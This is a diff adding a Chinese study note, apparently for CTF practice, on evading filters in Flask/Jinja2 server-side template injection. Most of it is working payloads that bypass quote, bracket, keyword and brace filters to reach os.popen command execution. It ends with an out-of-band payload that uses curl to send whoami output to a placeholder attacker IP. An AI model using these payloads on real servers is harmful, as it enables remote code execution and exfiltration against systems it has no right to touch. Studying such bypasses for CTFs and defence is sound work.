@@ -1,0 +1,40 @@
+#004
+ssti绕过
+在本片文章中将进一步讲述ssti
+FSAZ 2023-11-11
+过滤引号
+1"".__class__---->[].__class__---->0.__class__----->().__class__
+这是为了引出基类，而任何数据结构都可以引出基类，所以这里可以直接使用数组代替
+数据结构可以被替换为数组、字典，以及数字0
+
+2.__init__.__globals__["os"]["popen"]("whoami").read()
+2---->.__init__.__globals__[request.args.arg1]
+第一个引号就是获取字典内对应索引的value，这里我们可以使用request.args来绕过此处引号的过滤
+request.args是flask中一个存储着请求参数以及其值的字典，我们可以像这样来引用他
+后面的所有引号都可以使用该方法进行绕过
+
+还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()
+3.[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)]
+
+回看最初的payload，过滤中括号对我们影响最大的是什么，前边两个中括号都是为了从数组中取值，而后续的中括号实际是不必要的
+4.globals["os"]-------->globals.os
+
+5.a[0]------>a.getitem(0)
+而从数组中取值可以使用pop/getitem等数组自带方法
+不过还是建议用getitem，因为pop会破坏数组的结构.
+
+过滤关键字
+6.""["__cla"+"ss__"]
+  "".__getattribute__("__cla"+"ss__")
+  {{"".__getattribute__(request.args.a)}}&a=__class__
+
+6.利用原生函数 ,我们可以使用decode、replace等来绕过所过滤的关键字
+
+在比赛环境中，经常会阉割掉一些内置函数，我们可以尝试使用reload来重载
+7.reload(__builtins__)
+
+过滤{{}}
+8.{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
+相当于外带命令执行
+
+9."".__class__等价于""["__class__"]
